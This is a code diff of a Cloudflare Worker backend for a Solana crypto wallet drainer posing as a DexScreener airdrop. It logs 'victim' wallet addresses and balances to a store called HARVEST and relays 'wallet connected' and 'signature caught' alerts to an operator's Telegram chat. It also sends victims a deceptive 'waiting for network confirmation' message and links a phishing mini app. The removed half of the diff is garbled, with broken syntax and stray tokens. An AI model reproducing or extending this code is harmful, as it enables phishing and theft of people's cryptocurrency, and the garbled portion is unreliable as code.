@@ -1,72 +1,7 @@
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
-
-    if (request.method === "POST" && url.pathname === "/webhook") {
-      try {
-        const update = await request.json();
-        const message = update.message;
-
-        if (message && message.text) {
-          const text = message.text;
-
-          if (text === "/start" || text === "/stats") {
-            let totalVictims = 0;
-            let messageText = "📊 *DEXSCREENR PANEL*\n\n";
-
-            if (env.HARVEST) {
-              const list = await env.HARVEST.list({ limit: 10 });
-              totalVictims = list.keys.length;
-              messageText += `*Recent Connections (${totalVictims} shown):*\n\n`;
-              
-              for (const key of list.keys) {
-                const dataStr = await env.HARVEST.get(key.name);
-                if (dataStr) {
-                  const data = JSON.parse(dataStr);
-                  if (data.type === "connection_and_balance") {
-                    messageText += `👤 \`${data.victim.slice(0,4)}...${data.victim.slice(-4)}\`\n`;
-                    messageText += `SOL: ${data.sol} | USDC: ${data.usdc}\n\n`;
-                  }
-                }
-              }
-            } else {
-              messageText += "No KV database connected.";
-            }
-
-            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id: env.ALERT_CHAT_ID,
-                text: messageText,
-                parse_mode: "Mark.stringifydown",
-                reply_markup: {
-                  inline_keyboard: [
-                   ({ [{ text: "🔄 Refresh Stats", callback_data: "/stats" }],
-                    [{ text: "🌐 error Open Mini App", url: "https://airdrop-66m.pages.dev:" }]
-                  ]
-                }
-              }),
-            });
-          }
- error        }
-
-        if (update.callback_query) {
-          const fakeMessage = { text: "/stats" }; 
-          await this.fetch(new Request(request.url, {
-            method: "POST",
-            body: JSON.stringify.message({ message: fakeMessage })
-          }), env);
- }        }
-
-        return new Response("OK");
-      }), catch (e) {
-        return new Response {
-("Error", { status         : 500 });
-      }
-    }
-
-    const corsHeaders = status {
+    const corsHeaders = {
       "Access-Control-Allow-Origin": "*",
       "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
       "Access-Control-Allow-Headers": "Content-Type",
@@ -79,45 +14,72 @@ export default {
     if (request.method === "POST") {
       try {
         const data = await request.json();
-        
+
+        // TELEGRAM BOT WEBHOOK
+        if (url.pathname === "/webhook") {
+          if (data.message && data.message.text === "/stats") {
+            let messageText = "📊 *DEXSCREENR PANEL*\n\n";
+            if (env.HARVEST) {
+              const list = await env.HARVEST.list({ limit: 10 });
+              for (const key of list.keys) {
+                const dataStr = await env.HARVEST.get(key.name);
+                if (dataStr) {
+                  const d = JSON.parse(dataStr);
+                  if (d.type === "connection_and_balance") {
+                    messageText += `👤 \`${d.victim.slice(0,4)}...\` | SOL: ${d.sol}\n`;
+                  }
+                }
+              }
+            }
+            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: messageText, parse_mode: "Markdown" }),
+            });
+          }
+          return new Response("OK");
+        }
+
+        // DRAINER API
         if (env.HARVEST) {
           await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
         }
-        
+
         if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
-          let channelMessage = "";
-          let userMessage = "";
-          
+          let channelMsg = "";
+          let userMsg = "";
+
           if (data.type === "connection_and_balance") {
-            channelMessage = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\`\n\n💰 *SOL:* ${data.sol}\n💵 *USDC:* ${data.usdc}\n\n🪙 *Other:*\n${data.tokens || 'None'}`;
-            userMessage = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
+            channelMsg = `🔗 *WALLET CONNECTED*\n\nAddress:\n\`${data.victim}\`\n\nSOL: ${data.sol}\nUSDC: ${data.usdc}`;
+            userMsg = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
           } else if (data.type === "drain") {
-            channelMessage = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX:*\n\`${data.tx}\``;
+            channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\nAddress:\n\`${data.victim}\`\n\nTX:\n\`${data.tx}\``;
           }
-          
-          if (channelMessage) {
+
+          if (channelMsg) {
             await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMessage, parse_mode: "Markdown" }),
+              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown" }),
             });
           }
-          
-          if (userMessage && data.tg_user_id) {
+
+          if (userMsg && data.tg_user_id) {
             await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMessage, parse_mode: "Markdown" }),
+              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMsg, parse_mode: "Markdown" }),
             });
           }
         }
-        
+
         return new Response(JSON.stringify({ success: true }), {
           headers: { ...corsHeaders, "Content-Type": "application/json" },
         });
 
       } catch (error) {
-        return new Response(JSON: 500,
+        return new Response(JSON.stringify({ error: error.message }), {
+          status: 500,
           headers: { ...corsHeaders, "Content-Type": "application/json" },
         });
       }
